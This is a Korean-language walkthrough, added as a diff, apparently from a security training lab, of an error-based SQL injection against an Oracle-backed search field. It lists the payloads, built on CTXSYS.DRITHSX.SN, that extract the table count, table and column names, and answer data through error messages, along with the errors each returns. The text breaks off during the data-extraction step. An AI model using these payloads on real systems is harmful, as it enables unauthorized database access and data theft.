@@ -1,0 +1,52 @@
+
+1. 검색어에 (')싱글쿼터 입력 시 오류 발생 확인
+2. Error Based SQL Injection(테이블 갯수 확인) => 6개
+' AND CTXSYS.DRITHSX.SN(user,(SELECT COUNT(TABLE_NAME) FROM USER_TABLES))=1 AND '%1%'='%1
+=> 오류 구문
+ORA-20000: Oracle Text error: DRG-11701: thesaurus 6 does not exist ORA-06512: at "CTXSYS.DRUE", line 160 ORA-06512: at "CTXSYS.DRITHSX", line 540 ORA-06512: at line 1
+	6개의 테이블 갯수 확인
+	
+3. Error Based SQL Injection(테이블 명 확인)
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=1))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus BOARD does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=2))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus COMM_FILE does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=3))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus COMM_MDI_FILE does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=4))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus MEMBER does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=5))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus EQST_ANSWER does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM USER_TABLES) WHERE RNUM=6))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus ZIPCODE does not exist
+
+4. Error Based SQL Injection(컬럼 갯수 확인) => 5개
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='EQST_ANSWER'))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus 5 does not exist
+
+5. Error Based SQL Injection(컬럼 명 확인)
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='EQST_ANSWER') WHERE RNUM=1))=1 AND '%1%'='%1
+오류 구문: DRG-11701: DRG-11701: thesaurus ANSWER_COLUMN does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='EQST_ANSWER') WHERE RNUM=2))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus REG_DT does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='EQST_ANSWER') WHERE RNUM=3))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus REG_ACCT_ID does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='EQST_ANSWER') WHERE RNUM=4))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus UDT_DT does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='EQST_ANSWER') WHERE RNUM=5))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus UDT_ACCT_ID does not exist
+
+6. Error Based SQL Injection(데이터 확인)
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT ANSWER_COLUMN FROM (SELECT ROWNUM AS RNUM, ANSWER_COLUMN FROM EQST_ANSWER) WHERE RNUM=1))=1 AND '%1%'='%1
+오류 구문: DRG-11701: thesaurus skinfosec_eqst_lms_system does not exist
+
+입력 쿼리: ' AND CTXSYS.DRITHSX.SN(user,(SELECT ANSWER_COLUMN FROM (SELECT ROWNUM AS RNUM, ANSWER_COLUMN FROM EQST_ANSWER) WHERE RNUM=2))=1 AND '%1%'='%1
